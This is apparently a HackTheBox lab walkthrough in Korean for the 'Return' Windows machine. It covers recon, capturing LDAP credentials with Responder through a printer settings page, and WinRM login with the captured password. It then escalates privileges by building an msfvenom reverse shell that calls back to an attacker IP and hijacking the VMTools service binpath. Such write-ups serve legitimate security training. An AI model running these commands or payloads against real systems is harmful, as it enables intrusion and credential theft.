# Return - HackTheBox
## Recon
```bash
sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49681,49684,49699,49724 -sC -sV -vv -oA return 10.10.11.108
```
<img width="1104" height="438" alt="image" src="https://github.com/user-attachments/assets/989c7145-8438-4476-a731-6c7fc3475406" />

- HTTP(80)
- KERBEROS(88)
- LDAP(389)
- SMB(445)
- WINRM(5985)

---
## HTTP
### banner grabbing
```bash
whatweb http://10.10.11.108

curl -IL http://10.10.11.108
```
<img width="1104" height="267" alt="image" src="https://github.com/user-attachments/assets/bea0ab80-23fa-480e-a1eb-d47b481eb0cb" />

### RESPONDER
- `settings`탭에서 `update`버튼을 눌러 `burpsuite`로 가로채서 확인해보니 `ip`파라미터만 변경해서 전달이 가능.
<img width="773" height="355" alt="image" src="https://github.com/user-attachments/assets/3012fe70-f826-48dc-9a13-769c1a69b0eb" />

<br>
<br>

- 소스코드에서 포트는 389로 지정되어 있는 것을 확인.
<img width="773" height="175" alt="image" src="https://github.com/user-attachments/assets/88317cdd-3936-4ed4-a532-c0219b78cda8" />

<br>
<br>

- `responder`를 사용해서 해당 요청을 가로챌 수 있는지 확인.
```bash
sudo responder -I tun0 -v
```
<img width="773" height="577" alt="image" src="https://github.com/user-attachments/assets/63105297-dc7d-4e68-be72-70a156d09e94" />

<br>
<br>

- `burpsuite`에서 로컬 ip로 변경해서 전송.
<img width="773" height="350" alt="image" src="https://github.com/user-attachments/assets/f6bfed12-dc17-4971-a5d0-e69b3e1b114b" />

<br>
<br>

- 로그인 계정 획득.
<img width="773" height="101" alt="image" src="https://github.com/user-attachments/assets/9b8ad71e-6aa9-456f-aa3e-b48d5bbba107" />

---
## WINRM
- `svc-printer/1edFg43012!!`로 winrm 접속.
```bash
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
```
<img width="1102" height="277" alt="image" src="https://github.com/user-attachments/assets/7a917400-2f10-4eb7-9cda-bcca6fadb31e" />

---
## Privesc
- `Server Operators`그룹에 속해있는 것을 확인.
- 해당 그룹에 속할 경우 service를 수정하여 멈추고 시작할 수 있음.
```powershell
net user svc-printer
```
<img width="1102" height="536" alt="image" src="https://github.com/user-attachments/assets/9a2a06aa-3010-46c0-b81f-572a0daebe21" />

<br>
<br>

- https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/
- `VMTools` 서비스 확인.
```powershell
services
```
<img width="1102" height="540" alt="image" src="https://github.com/user-attachments/assets/f726a47b-5ff4-4f5f-b749-0b035f7f4a03" />

<br>
<br>

- reverse shell 페이로드 생성.
```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.16.4 lport=80 -f exe -o shell.exe
```
<img width="1102" height="171" alt="image" src="https://github.com/user-attachments/assets/45b0026a-99a6-4bea-a075-35bb4062f0b7" />

<br>
<br>

- `vmtools`서비스를 변경해서 실행.
```powershell
sc.exe config vmtools binpath="c:\temp\shell.exe"

sc.exe stop vmtools

sc.exe start vmtools
```
<img width="1102" height="173" alt="image" src="https://github.com/user-attachments/assets/c6970b38-732f-4e88-9230-981c4fe32a8c" />

<br>
<br>

- 셸 획득.
<img width="1102" height="206" alt="image" src="https://github.com/user-attachments/assets/eb332a2f-7d47-4c64-8670-b6fb52205cae" />

---
## FLAG
- `c:\users\svc-printer\desktop\user.txt`
<img width="1102" height="247" alt="image" src="https://github.com/user-attachments/assets/2bee874b-9ed5-4945-9a4b-e6e73f176654" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1102" height="247" alt="image" src="https://github.com/user-attachments/assets/f40ead28-49e9-4c46-99a6-db1c5dfdbf42" />














